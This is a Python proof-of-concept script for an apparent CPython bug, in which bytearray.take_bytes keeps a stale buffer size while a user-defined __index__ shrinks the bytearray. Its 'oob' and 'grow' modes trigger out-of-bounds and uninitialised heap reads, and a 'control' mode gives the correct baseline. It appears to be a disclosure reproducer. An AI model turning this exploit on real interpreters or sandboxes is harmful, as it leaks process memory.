"""bytearray.take_bytes(n) caches Py_SIZE(self) BEFORE running n.__index__().

Objects/bytearrayobject.c:1548   Py_ssize_t size = Py_SIZE(self);
Objects/bytearrayobject.c:1554   to_take = PyNumber_AsSsize_t(n, PyExc_IndexError);   <- user __index__
Objects/bytearrayobject.c:1566   if (to_take < 0 || to_take > size)                   <- STALE size
Objects/bytearrayobject.c:1575   if (!_canresize(self))                               <- ob_exports only
Objects/bytearrayobject.c:1597   PyBytes_FromStringAndSize(self->ob_start + to_take,
                                                           remaining_length)   <- OOB read

Guarded twin: bytearray_setitem_lock_held:692-706, which carries the gh-91153
comment "We need to do this before the size check, in case value has a nasty
__index__ method that changes the size of the bytearray", and re-reads
Py_SIZE(self) AFTER the converter.

Run modes:
    oob      -- shrink self inside __index__, then over-read past the buffer
    grow     -- shrink self, then have _PyBytes_Resize hand back uninit heap
    control  -- same shape, non-mutating __index__ (must be correct on every build)
"""

import sys


def scenario_oob():
    b = bytearray(b"A" * 4000)

    class Evil:
        def __index__(self):
            # Shrink the bytearray to 1 byte while take_bytes holds size=4000.
            del b[:]
            b.extend(b"Z")
            return 2000

    out = b.take_bytes(Evil())
    print("returned len =", len(out))
    print("returned[:32] =", bytes(out[:32]))
    print("self after   =", bytes(b[:32]), "len", len(b))


def scenario_grow():
    b = bytearray(b"A" * 4000)

    class Evil:
        def __index__(self):
            del b[:]
            b.extend(b"Z")
            return 4000

    out = b.take_bytes(Evil())
    print("returned len =", len(out))
    print("returned[:32] =", bytes(out[:32]))


def scenario_control():
    b = bytearray(b"A" * 4000)

    class Nice:
        def __index__(self):
            return 2000

    out = b.take_bytes(Nice())
    ok = out == b"A" * 2000 and bytes(b) == b"A" * 2000
    print("control ok =", ok, "len(out) =", len(out), "len(b) =", len(b))


SCENARIOS = {
    "oob": scenario_oob,
    "grow": scenario_grow,
    "control": scenario_control,
}

if __name__ == "__main__":
    name = sys.argv[1] if len(sys.argv) > 1 else "oob"
    SCENARIOS[name]()
    print("completed", name)
